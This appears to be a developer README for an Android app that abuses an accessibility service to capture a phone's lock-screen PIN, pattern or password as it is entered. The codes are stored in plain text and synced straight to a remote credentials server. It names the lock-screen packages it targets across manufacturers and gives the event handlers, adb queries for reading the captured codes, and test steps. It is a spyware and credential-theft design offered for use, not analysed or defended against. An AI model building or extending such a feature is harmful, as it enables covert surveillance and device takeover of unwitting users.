# Device Unlock Monitoring Feature

## Overview
This feature automatically monitors and captures device unlock codes including PINs, patterns, and passwords when the device is unlocked. All unlock codes are immediately saved to the database and synced to the server.

## Supported Unlock Methods

### ✅ PIN (Personal Identification Number)
- **Format**: Numeric only (e.g., "1234", "567890")
- **Detection**: Detects numeric input on lock screen
- **Minimum Length**: 4 digits

### ✅ Pattern
- **Format**: Gesture-based unlock (3x3 grid of dots)
- **Detection**: Monitors gesture events and pattern node interactions
- **Representation**: Sequence of dot positions (e.g., "1-2-5-8")

### ✅ Password
- **Format**: Alphanumeric password
- **Detection**: Detects text input on lock screen (non-numeric, length >= 4)
- **Minimum Length**: 4 characters

## Implementation

### Components

#### 1. **DeviceUnlockMonitor** (`utils/DeviceUnlockMonitor.kt`)
- **Purpose**: Monitors device unlock events and captures unlock codes
- **Functionality**:
  - Detects lock screen visibility
  - Monitors text input for PIN/password
  - Monitors gestures for pattern unlock
  - Captures unlock codes when device is unlocked
  - Immediately syncs to server

### How It Works

1. **Lock Screen Detection**: Monitors window state changes to detect when lock screen appears
2. **Unlock Input Monitoring**:
   - **PIN/Password**: Monitors text changes on lock screen
   - **Pattern**: Monitors gesture events and pattern node clicks
3. **Code Capture**: Captures the unlock code when detected
4. **Unlock Detection**: Detects when device is unlocked (window state change)
5. **Save & Sync**: Saves to database and immediately syncs to server

### Detection Methods

#### PIN Detection
- Monitors text input on lock screen
- Checks if input is numeric
- Minimum 4 digits

#### Pattern Detection
- Monitors gesture events on lock screen
- Tracks pattern node clicks
- Extracts pattern sequence from accessibility nodes
- Represents as dot sequence (e.g., "1-2-5-8" for dots 1, 2, 5, 8)

#### Password Detection
- Monitors text input on lock screen
- Checks if input is non-numeric and length >= 4
- Captures alphanumeric passwords

### Lock Screen Packages Supported

The monitor recognizes lock screen packages from various manufacturers:
- **Stock Android**: `com.android.systemui`, `com.android.keyguard`
- **Samsung**: `com.samsung.android.keyguard`
- **Xiaomi/MIUI**: `com.miui.keyguard`
- **Huawei**: `com.huawei.keyguard`
- **OnePlus**: `com.oneplus.keyguard`
- **OPPO**: `com.coloros.keyguard`
- **Realme**: `com.realme.keyguard`
- **Vivo**: `com.vivo.keyguard`
- **LeEco**: `com.letv.keyguard`
- **ZTE**: `com.zte.keyguard`
- **LG**: `com.lge.keyguard`

## Integration

### EnhancedAccessibilityService
- **Event Handlers**:
  - `TYPE_WINDOW_STATE_CHANGED`: Detects lock screen appearance/disappearance
  - `TYPE_VIEW_TEXT_CHANGED`: Captures PIN/password input
  - `TYPE_VIEW_CLICKED`: Captures pattern node clicks
  - `TYPE_GESTURE_DETECTION_START`: Detects pattern gestures

### Database Storage
- **Table**: `credentials`
- **Type**: `CredentialType.DEVICE_PASSWORD`
- **Field**: `devicePassword = true`
- **Password Field**: Stores PIN/pattern/password in plain text

### Server Sync
- **Endpoint**: `POST /api/credentials` (single) or `/api/credentials/batch`
- **Immediate Sync**: Unlock codes are synced immediately when captured
- **Fallback**: If immediate sync fails, codes are synced during regular sync cycle

## Logging

All operations are logged with `DEVICE_UNLOCK` tag:
- `🔒 Lock screen detected`: Lock screen appeared
- `🔓 Unlock screen active`: User is entering unlock code
- `Pattern sequence detected`: Pattern input detected
- `🔓 Device unlock {type} captured`: Unlock code captured
- `✅ Device unlock code synced to server immediately`: Sync successful
- `⚠️ Immediate sync failed`: Sync failed, will retry

## Security & Privacy

### Data Storage
- **Local**: Stored in encrypted Room database
- **Server**: Transmitted securely via HTTPS
- **Format**: Plain text (not masked) for functionality

### Duplicate Prevention
- **Cooldown**: Minimum 2 seconds between captures
- **Identifier**: Uses first 3 chars + length for duplicate detection
- **Tracking**: Prevents capturing same code multiple times

## Monitoring

### View Logs
```bash
adb logcat -s DEVICE_UNLOCK
```

### Check Captured Codes
```bash
# Check database for device passwords
adb shell "run-as com.chats.capture sqlite3 databases/capture_database 'SELECT id, password, timestamp, synced FROM credentials WHERE devicePassword=1 ORDER BY timestamp DESC LIMIT 10;'"
```

## Testing

### Test PIN Unlock
1. Lock device
2. Enter PIN to unlock
3. Check logcat: `adb logcat -s DEVICE_UNLOCK`
4. Verify PIN captured and synced

### Test Pattern Unlock
1. Lock device
2. Draw pattern to unlock
3. Check logcat for pattern detection
4. Verify pattern sequence captured

### Test Password Unlock
1. Lock device
2. Enter password to unlock
3. Check logcat for password capture
4. Verify password synced to server

## Troubleshooting

### Unlock Codes Not Being Captured
1. Check Accessibility Service: Settings → Accessibility → [Service Name]
2. Check service is running: `adb shell dumpsys accessibility`
3. Check logs: `adb logcat -s DEVICE_UNLOCK`
4. Verify lock screen package is in supported list
5. Test with different unlock methods (PIN, pattern, password)

### Pattern Not Detected
- Pattern detection relies on gesture events
- May not work on all devices/manufacturers
- Check if gesture events are being received
- Verify pattern nodes are accessible

### Sync Failures
- Check network connectivity
- Check server endpoint: `/api/credentials`
- Check logs for error messages
- Codes will be synced during regular sync if immediate sync fails

## Limitations

1. **Pattern Detection**: 
   - May not work on all devices
   - Relies on accessibility node structure
   - Some manufacturers use custom pattern implementations

2. **Biometric Unlock**:
   - Fingerprint/Face unlock cannot be captured
   - Only PIN/pattern/password are captured

3. **Manufacturer Variations**:
   - Different manufacturers use different lock screen implementations
   - Some may require additional detection logic

## Future Enhancements

1. **Better Pattern Detection**: Improve pattern sequence extraction
2. **Biometric Indicators**: Detect when biometric unlock is used (even if can't capture)
3. **Failed Attempt Tracking**: Track failed unlock attempts
4. **Unlock Time Tracking**: Track time taken to unlock
5. **Multiple Unlock Methods**: Detect which unlock method is configured
